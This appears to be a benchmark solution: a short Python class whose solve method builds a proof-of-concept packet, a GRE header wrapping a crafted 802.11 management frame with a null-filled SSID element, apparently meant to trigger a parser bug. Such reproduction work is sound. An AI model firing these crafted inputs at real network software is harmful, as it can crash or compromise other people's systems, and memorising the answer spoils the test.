class Solution:
    def solve(self, src_path: str) -> bytes:
        gre_header = b'\x00\x00\x12\x34'
        fc = b'\x40\x00'
        duration = b'\x00\x00'
        da = b'\xff\xff\xff\xff\xff\xff'
        sa = b'\x00\x00\x00\x00\x00\x00'
        bssid = b'\x00\x00\x00\x00\x00\x00'
        seq = b'\x00\x00'
        ssid_ie = b'\x00\x0f' + b'\x00' * 15
        poc80211 = fc + duration + da + sa + bssid + seq + ssid_ie
        return gre_header + poc80211
